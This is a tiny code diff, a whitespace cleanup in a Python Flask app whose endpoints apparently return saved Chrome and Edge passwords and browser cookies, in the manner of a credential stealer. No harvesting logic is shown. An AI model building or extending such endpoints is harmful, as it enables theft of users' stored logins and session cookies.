@@ -15,8 +15,7 @@ def obtener_contrasenias_c():
         salida_chrome = con_chrome()
         salida_edge = con_edge()
         salida = {"chrome": salida_chrome, "edge":salida_edge}
-        return  salida    
-
+        return  salida
 
 @app.route('/obtener_cookies', methods=['POST'])
 def obtener_cookies_c():
